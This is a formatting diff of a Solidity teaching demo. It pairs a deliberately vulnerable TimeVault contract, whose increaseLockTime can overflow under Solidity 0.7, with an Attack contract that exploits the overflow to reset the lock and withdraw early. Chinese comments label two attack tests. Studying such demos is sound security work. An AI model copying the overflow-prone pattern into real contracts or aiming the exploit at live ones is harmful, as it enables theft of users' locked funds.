@@ -1,4 +1,3 @@
-
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.7.6;
 
@@ -19,23 +18,26 @@ pragma solidity ^0.7.6;
 */
 
 contract TimeVault {
-    mapping(address => uint) public balances;
-    mapping(address => uint) public lockTime;
+    mapping(address => uint256) public balances;
+    mapping(address => uint256) public lockTime;
 
     function deposit() external payable {
         balances[msg.sender] += msg.value;
         lockTime[msg.sender] = block.timestamp + 1 weeks;
     }
 
-    function increaseLockTime(uint _secondsToIncrease) public {
+    function increaseLockTime(uint256 _secondsToIncrease) public {
         lockTime[msg.sender] += _secondsToIncrease;
     }
 
     function withdraw() public {
         require(balances[msg.sender] > 0, "Insufficient funds");
-        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
+        require(
+            block.timestamp > lockTime[msg.sender],
+            "Lock time not expired"
+        );
 
-        uint amount = balances[msg.sender];
+        uint256 amount = balances[msg.sender];
         balances[msg.sender] = 0;
 
         (bool sent, ) = msg.sender.call{value: amount}("");
@@ -43,10 +45,9 @@ contract TimeVault {
     }
 }
 
-
-
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+
 contract Attack {
     address public preyAddr;
 
@@ -57,9 +58,12 @@ contract Attack {
     fallback() external payable {}
 
     function deposit() public payable {
-        (bool success,) = preyAddr.call{value: 1 ether}(abi.encodeWithSignature("deposit()")); 
+        (bool success, ) = preyAddr.call{value: 1 ether}(
+            abi.encodeWithSignature("deposit()")
+        );
         require(success, "deposit function, failed to deposit");
     }
+
     // 攻击测试一： 手动存款，手动设置时间触发溢出漏洞
     function attack1(uint256 timesec) public payable {
         /*
@@ -72,7 +76,12 @@ contract Attack {
         // uint timesec;
         // preyAddr.call(abi.encodeWithSignature("lockTime(address)",address(this)));
 
-        (bool success,) = preyAddr.call(abi.encodeWithSignature("increaseLockTime(uint256)",type(uint).max + 1 - timesec));
+        (bool success, ) = preyAddr.call(
+            abi.encodeWithSignature(
+                "increaseLockTime(uint256)",
+                type(uint256).max + 1 - timesec
+            )
+        );
         require(success, "attack function, failed to increaseLockTime");
         preyAddr.call(abi.encodeWithSignature("withdraw()"));
     }
@@ -80,15 +89,24 @@ contract Attack {
     // 攻击测试二： 存款，触发漏洞，取款
     function attack2() public payable {
         // 存款
-        (bool success1,) = preyAddr.call{value: 1 ether}(abi.encodeWithSignature("deposit()")); 
+        (bool success1, ) = preyAddr.call{value: 1 ether}(
+            abi.encodeWithSignature("deposit()")
+        );
         require(success1, "deposit function, failed to deposit");
         // uint timesec;
-        (bool success2, bytes memory data) = preyAddr.call(abi.encodeWithSignature("lockTime(address)",address(this)));
+        (bool success2, bytes memory data) = preyAddr.call(
+            abi.encodeWithSignature("lockTime(address)", address(this))
+        );
         require(success2, "attack function, failed to increaseLockTime");
-        uint timesec;
-        timesec = abi.decode(data,(uint));
+        uint256 timesec;
+        timesec = abi.decode(data, (uint256));
         // 取款
-        (bool success3,) = preyAddr.call(abi.encodeWithSignature("increaseLockTime(uint256)",type(uint).max + 1 - timesec));
+        (bool success3, ) = preyAddr.call(
+            abi.encodeWithSignature(
+                "increaseLockTime(uint256)",
+                type(uint256).max + 1 - timesec
+            )
+        );
         require(success3, "attack function, failed to increaseLockTime");
         preyAddr.call(abi.encodeWithSignature("withdraw()"));
     }
